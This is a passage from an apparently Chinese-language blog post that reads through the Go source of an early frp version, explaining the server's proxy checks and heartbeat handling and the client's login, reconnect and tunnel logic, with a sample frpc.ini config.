&amp;msg.ClientCtlReq&#123;&#125;</span><br><span class="line">clientCtlRes := &amp;msg.ClientCtlRes&#123;&#125;</span><br><span class="line"><span class="keyword">if</span> err := json.Unmarshal([]<span class="type">byte</span>(res), &amp;clientCtlReq); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Warn(<span class="string">&quot;Parse err: %v : %s&quot;</span>, err, res)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★ 检查代理配置是否正确</span></span><br><span class="line">succ, info, needRes := checkProxy(clientCtlReq, c)</span><br><span class="line"><span class="keyword">if</span> !succ &#123;</span><br><span class="line">clientCtlRes.Code = <span class="number">1</span></span><br><span class="line">clientCtlRes.Msg = info</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> needRes &#123;</span><br><span class="line"><span class="comment">// 如果需要响应客户端，则在函数结束前关闭连接</span></span><br><span class="line"><span class="keyword">defer</span> c.Close()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将响应消息序列化并写入连接</span></span><br><span class="line">buf, _ := json.Marshal(clientCtlRes)</span><br><span class="line">err = c.Write(<span class="type">string</span>(buf) + <span class="string">&quot;\\n&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Warn(<span class="string">&quot;Write error, %v&quot;</span>, err)</span><br><span class="line">time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查代理连接是否存在</span></span><br><span class="line">s, ok := server.ProxyServers[clientCtlReq.ProxyName]</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line">log.Warn(<span class="string">&quot;ProxyName [%s] is not exist&quot;</span>, clientCtlReq.ProxyName)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★ 启动一个新的协程，用于读取客户端发送的控制信息</span></span><br><span class="line"><span class="keyword">go</span> readControlMsgFromClient(s, c)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个新的 ClientCtlReq 结构体，并设置类型为工作连接</span></span><br><span class="line">serverCtlReq := &amp;msg.ClientCtlReq&#123;&#125;</span><br><span class="line">serverCtlReq.Type = consts.WorkConn</span><br><span class="line"><span class="comment">// 进入一个循环，等待用户连接，如果代理服务器关闭，记录调试信息并退出循环</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">closeFlag := s.WaitUserConn()</span><br><span class="line"><span class="keyword">if</span> closeFlag &#123;</span><br><span class="line">log.Debug(<span class="string">&quot;ProxyName [%s], goroutine for dealing user conn is closed&quot;</span>, s.Name)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 序列化服务器控制请求并写入连接。如果写入失败，记录警告，关闭代理服务器并返回</span></span><br><span class="line">buf, _ := json.Marshal(serverCtlReq)</span><br><span class="line">err = c.Write(<span class="type">string</span>(buf) + <span class="string">&quot;\\n&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Warn(<span class="string">&quot;ProxyName [%s], write to client error, proxy exit&quot;</span>, s.Name)</span><br><span class="line">s.Close()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">log.Debug(<span class="string">&quot;ProxyName [%s], write to client to add work conn success&quot;</span>, s.Name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">log.Info(<span class="string">&quot;ProxyName [%s], I&#x27;m dead!&quot;</span>, s.Name)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>checkProxy</code> 函数首先检验代理是否合法，然后通过检查 <code>req.Type</code> 的值来区分控制连接和工作连接。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">checkProxy</span><span class="params">(req *msg.ClientCtlReq, c *conn.Conn)</span></span> (succ <span class="type">bool</span>, info <span class="type">string</span>, needRes <span class="type">bool</span>) &#123;</span><br><span class="line">succ = <span class="literal">false</span>    <span class="comment">// 默认设置成功标志为 false</span></span><br><span class="line">needRes = <span class="literal">true</span>  <span class="comment">// 默认需要向客户端发送响应</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查代理名称是否存在</span></span><br><span class="line">s, ok := server.ProxyServers[req.ProxyName]</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line">info = fmt.Sprintf(<span class="string">&quot;ProxyName [%s] is not exist&quot;</span>, req.ProxyName)</span><br><span class="line">log.Warn(info)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查密码是否正确</span></span><br><span class="line"><span class="keyword">if</span> req.Passwd != s.Passwd &#123;</span><br><span class="line">info = fmt.Sprintf(<span class="string">&quot;ProxyName [%s], password is not correct&quot;</span>, req.ProxyName)</span><br><span class="line">log.Warn(info)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据请求类型处理控制连接或工作连接</span></span><br><span class="line"><span class="keyword">if</span> req.Type == consts.CtlConn &#123;</span><br><span class="line"><span class="comment">// 如果是控制连接</span></span><br><span class="line"><span class="keyword">if</span> s.Status != consts.Idle &#123;</span><br><span class="line">            <span class="comment">// 如果代理已经在使用中，设置错误信息</span></span><br><span class="line">info = fmt.Sprintf(<span class="string">&quot;ProxyName [%s], already in use&quot;</span>, req.ProxyName)</span><br><span class="line">log.Warn(info)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动代理并监听用户连接，此操作不会阻塞</span></span><br><span class="line">err := s.Start()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">info = fmt.Sprintf(<span class="string">&quot;ProxyName [%s], start proxy error: %v&quot;</span>, req.ProxyName, err.Error())</span><br><span class="line">log.Warn(info)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">log.Info(<span class="string">&quot;ProxyName [%s], start proxy success&quot;</span>, req.ProxyName)</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> req.Type == consts.WorkConn &#123;</span><br><span class="line"><span class="comment">// 如果是工作连接，则不需要向客户端发送响应</span></span><br><span class="line">needRes = <span class="literal">false</span></span><br><span class="line"><span class="keyword">if</span> s.Status != consts.Working &#123;</span><br><span class="line">log.Warn(<span class="string">&quot;ProxyName [%s], is not working when it gets one new work conn&quot;</span>, req.ProxyName)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s.GetNewCliConn(c) <span class="comment">// 获取新的客户端连接</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">info = fmt.Sprintf(<span class="string">&quot;ProxyName [%s], type [%d] unsupport&quot;</span>, req.ProxyName, req.Type)</span><br><span class="line">log.Warn(info)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果所有检查都通过，则设置成功标志为 true</span></span><br><span class="line">succ = <span class="literal">true</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中控制连接主要用于设置和维护工作连接，以及进行心跳检测来确保客户端仍然活跃。</p><p>控制连接是客户端与服务器之间的初始连接，用于管理和控制代理的状态。在控制连接中，客户端会发送一个包含代理名称和密码的请求，服务器会验证这些信息，如果验证成功，服务器就会根据请求的类型来启动代理或处理其他控制消息。</p><p>而工作连接是在控制连接建立后由客户端发起的，用于实际的数据传输。工作连接允许用户数据通过代理服务器转发，实现客户端和服务端之间的通信。</p><p><code>readControlMsgFromClient</code> 函数用于读取客户端发送的控制信息 ，它接受一个代理服务器和连接作为参数，用于读取客户端发送的控制消息，包括对心跳信息的处理，用于保持客户端和服务端的连接。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">readControlMsgFromClient</span><span class="params">(s *server.ProxyServer, c *conn.Conn)</span></span> &#123;</span><br><span class="line"><span class="comment">// 用于控制循环读取消息的条件</span></span><br><span class="line">isContinueRead := <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 用于处理心跳超时的情况，超时则关闭服务器连接</span></span><br><span class="line">f := <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">isContinueRead = <span class="literal">false</span></span><br><span class="line">s.Close()</span><br><span class="line">log.Error(<span class="string">&quot;ProxyName [%s], client heartbeat timeout&quot;</span>, s.Name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个定时器 timer，在 HeartBeatTimeout 时间后执行函数 f</span></span><br><span class="line">timer := time.AfterFunc(time.Duration(server.HeartBeatTimeout)*time.Second, f)</span><br><span class="line"><span class="comment">// defer 语句保证在函数结束时停止定时器。</span></span><br><span class="line"><span class="keyword">defer</span> timer.Stop()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 循环读取客户端发送的消息，连接超时则跳出循环</span></span><br><span class="line"><span class="keyword">for</span> isContinueRead &#123;</span><br><span class="line"><span class="comment">// 从连接 c 中读取一行消息，存储在 content 中</span></span><br><span class="line">content, err := c.ReadLine()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err == io.EOF &#123;</span><br><span class="line">log.Warn(<span class="string">&quot;ProxyName [%s], client is dead!&quot;</span>, s.Name)</span><br><span class="line">s.Close()</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> <span class="literal">nil</span> == c || c.IsClosed() &#123;</span><br><span class="line">log.Warn(<span class="string">&quot;ProxyName [%s], client connection is closed&quot;</span>, s.Name)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">log.Error(<span class="string">&quot;ProxyName [%s], read error: %v&quot;</span>, s.Name, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个指针，存储解析后的客户端控制请求消息</span></span><br><span class="line">clientCtlReq := &amp;msg.ClientCtlReq&#123;&#125;</span><br><span class="line"><span class="comment">// 将 content 解析为 msg.ClientCtlReq 结构体，并将解析结果存储在 clientCtlReq 中</span></span><br><span class="line"><span class="keyword">if</span> err := json.Unmarshal([]<span class="type">byte</span>(content), clientCtlReq); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Warn(<span class="string">&quot;Parse err: %v : %s&quot;</span>, err, content)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 判断消息是否为心跳请求</span></span><br><span class="line"><span class="keyword">if</span> consts.CSHeartBeatReq == clientCtlReq.Type &#123;</span><br><span class="line">log.Debug(<span class="string">&quot;ProxyName [%s], get heartbeat&quot;</span>, s.Name)</span><br><span class="line"><span class="comment">// 重置定时器，延长心跳超时时间，确保客户端保持活跃</span></span><br><span class="line">timer.Reset(time.Duration(server.HeartBeatTimeout) * time.Second)</span><br><span class="line">clientCtlRes := &amp;msg.ClientCtlRes&#123;&#125;</span><br><span class="line"><span class="comment">// 设置心跳响应消息的响应码为 consts.SCHeartBeatRes，然后将响应序列化为 JSON 格式字符串</span></span><br><span class="line">clientCtlRes.GeneralRes.Code = consts.SCHeartBeatRes</span><br><span class="line">response, err := json.Marshal(clientCtlRes)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Warn(<span class="string">&quot;Serialize ClientCtlRes err! err: %v&quot;</span>, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = c.Write(<span class="type">string</span>(response) + <span class="string">&quot;\\n&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Error(<span class="string">&quot;Send heartbeat response to client failed! Err:%v&quot;</span>, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="frpc"><a href="#frpc" class="headerlink" title="frpc"></a>frpc</h3><p><code>ini</code> 配置文件如下：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">log_file</span> = ./frpc.log</span><br><span class="line"><span class="comment"># debug, info, warn, error</span></span><br><span class="line"><span class="attr">log_level</span> = debug</span><br><span class="line"><span class="comment"># file, console</span></span><br><span class="line"><span class="attr">log_way</span> = console</span><br><span class="line"></span><br><span class="line"><span class="section">[test1]</span></span><br><span class="line"><span class="attr">passwd</span> = <span class="number">123</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">22</span></span><br></pre></td></tr></table></figure><p>同样是入口文件开始，位置是 <code>src/frp/cmd/frpc/main.go</code>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">err := client.LoadConf(<span class="string">&quot;./frpc.ini&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">os.Exit(<span class="number">-1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">log.InitLog(client.LogWay, client.LogFile, client.LogLevel)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待所有控制协程退出，实际上是在声明将会有 len(client.ProxyClients) 数量的协程</span></span><br><span class="line"><span class="keyword">var</span> wait sync.WaitGroup</span><br><span class="line">wait.Add(<span class="built_in">len</span>(client.ProxyClients))</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历所有代理客户端，并为每个客户端启动一个控制协程</span></span><br><span class="line"><span class="keyword">for</span> _, client := <span class="keyword">range</span> client.ProxyClients &#123;</span><br><span class="line"><span class="keyword">go</span> ControlProcess(client, &amp;wait)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">log.Info(<span class="string">&quot;Start frpc success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待所有控制协程退出</span></span><br><span class="line">wait.Wait()</span><br><span class="line">log.Warn(<span class="string">&quot;All proxy exit!&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加载配置文件和日志初始化都讲过了，不再赘述。将目光移至 <code>src/frp/cmd/frpc/control.go</code>，看看用于处理客户端的 <code>ControlProcess()</code>。其中关键函数是用于连接服务端的 <code>loginToServer</code> 函数。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ControlProcess</span><span class="params">(cli *client.ProxyClient, wait *sync.WaitGroup)</span></span> &#123;</span><br><span class="line">    <span class="comment">// 延迟 wait.Done() 的执行直到 ControlProcess( )函数即将返回</span></span><br><span class="line">    <span class="comment">// 这是通知 sync.WaitGroup 当前协程已经完成的标准方式</span></span><br><span class="line"><span class="keyword">defer</span> wait.Done()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★ 尝试登录到服务器，如果成功，返回一个连接对象</span></span><br><span class="line">c, err := loginToServer(cli)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Error(<span class="string">&quot;ProxyName [%s], connect to server failed!&quot;</span>, cli.Name)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">connection = c</span><br><span class="line">    <span class="comment">// 确保函数结束时关闭网络连接</span></span><br><span class="line"><span class="keyword">defer</span> connection.Close()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 无限循环并从服务器读取数据</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">content, err := connection.ReadLine()</span><br><span class="line">        <span class="comment">// 遇到 io.EOF 或连接被关闭，尝试重新连接服务器</span></span><br><span class="line"><span class="keyword">if</span> err == io.EOF || <span class="literal">nil</span> == connection || connection.IsClosed() &#123;</span><br><span class="line">log.Debug(<span class="string">&quot;ProxyName [%s], server close this control conn&quot;</span>, cli.Name)</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 使用指数退避策略来重连服务器，每次失败后等待时间翻倍，直到最大 60 秒</span></span><br><span class="line">            <span class="keyword">var</span> sleepTime time.Duration = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">log.Debug(<span class="string">&quot;ProxyName [%s], try to reconnect to server[%s:%d]...&quot;</span>, cli.Name, client.ServerAddr, client.ServerPort)</span><br><span class="line">tmpConn, err := loginToServer(cli)</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">connection.Close()</span><br><span class="line">connection = tmpConn</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sleepTime &lt; <span class="number">60</span> &#123;</span><br><span class="line">sleepTime = sleepTime * <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line">time.Sleep(sleepTime * time.Second)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Warn(<span class="string">&quot;ProxyName [%s], read from server error, %v&quot;</span>, cli.Name, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 尝试解析服务器返回的内容为 ClientCtlRes 结构体</span></span><br><span class="line">clientCtlRes := &amp;msg.ClientCtlRes&#123;&#125;</span><br><span class="line"><span class="keyword">if</span> err := json.Unmarshal([]<span class="type">byte</span>(content), clientCtlRes); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Warn(<span class="string">&quot;Parse err: %v : %s&quot;</span>, err, content)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 检查是否收到心跳响应，如果是，则重置心跳计时器</span></span><br><span class="line"><span class="keyword">if</span> consts.SCHeartBeatRes == clientCtlRes.GeneralRes.Code &#123;</span><br><span class="line"><span class="keyword">if</span> heartBeatTimer != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Debug(<span class="string">&quot;Client rcv heartbeat response&quot;</span>)</span><br><span class="line">heartBeatTimer.Reset(time.Duration(client.HeartBeatTimeout) * time.Second)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">log.Error(<span class="string">&quot;heartBeatTimer is nil&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★ 如果收到的不是心跳响应，则尝试启动隧道</span></span><br><span class="line">cli.StartTunnel(client.ServerAddr, client.ServerPort)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来是 <code>loginToServer</code> 函数，核心函数有两个，分别是用于连接到指定地址端口的 <code>ConnectServer</code> 和用于启动心跳检测的 <code>startHeartBeat</code> 函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">loginToServer</span><span class="params">(cli *client.ProxyClient)</span></span> (c *conn.Conn, err <span class="type">error</span>) &#123;</span><br><span class="line"><span class="comment">// ★ 建立连接，返回一个连接对象</span></span><br><span class="line">    c, err = conn.ConnectServer(client.ServerAddr, client.ServerPort)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Error(<span class="string">&quot;ProxyName [%s], connect to server [%s:%d] error, %v&quot;</span>, cli.Name, client.ServerAddr, client.ServerPort, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个 ClientCtlReq 结构体，指定请求类型 CtlConn，表示这是一个控制连接请求</span></span><br><span class="line">req := &amp;msg.ClientCtlReq&#123;</span><br><span class="line">Type:      consts.CtlConn,</span><br><span class="line">ProxyName: cli.Name,</span><br><span class="line">Passwd:    cli.Passwd,</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 序列化为 JSON 并发送请求</span></span><br><span class="line">buf, _ := json.Marshal(req)</span><br><span class="line">err = c.Write(<span class="type">string</span>(buf) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Error(<span class="string">&quot;ProxyName [%s], write to server error, %v&quot;</span>, cli.Name, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取响应</span></span><br><span class="line">res, err := c.ReadLine()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Error(<span class="string">&quot;ProxyName [%s], read from server error, %v&quot;</span>, cli.Name, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">log.Debug(<span class="string">&quot;ProxyName [%s], read [%s]&quot;</span>, cli.Name, res)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将响应的内容解析为 ClientCtlRes 结构体</span></span><br><span class="line">clientCtlRes := &amp;msg.ClientCtlRes&#123;&#125;</span><br><span class="line"><span class="keyword">if</span> err = json.Unmarshal([]<span class="type">byte</span>(res), &amp;clientCtlRes); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Error(<span class="string">&quot;ProxyName [%s], format server response error, %v&quot;</span>, cli.Name, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查响应代码</span></span><br><span class="line"><span class="keyword">if</span> clientCtlRes.Code != <span class="number">0</span> &#123;</span><br><span class="line">log.Error(<span class="string">&quot;ProxyName [%s], start proxy error, %s&quot;</span>, cli.Name, clientCtlRes.Msg)</span><br><span class="line"><span class="keyword">return</span> c, fmt.Errorf(<span class="string">&quot;%s&quot;</span>, clientCtlRes.Msg)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★ 启动心跳</span></span><br><span class="line"><span class="keyword">go</span> startHeartBeat(c)</span><br><span class="line">log.Debug(<span class="string">&quot;ProxyName [%s], connect to server[%s:%d] success!&quot;</span>, cli.Name, client.ServerAddr, client.ServerPort)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看实现连接的<code>ConnectServer</code> 函数，位于 <code>utils/conn</code>。这个函数实际上是对普通 TCP 连接的封装：</p><figure 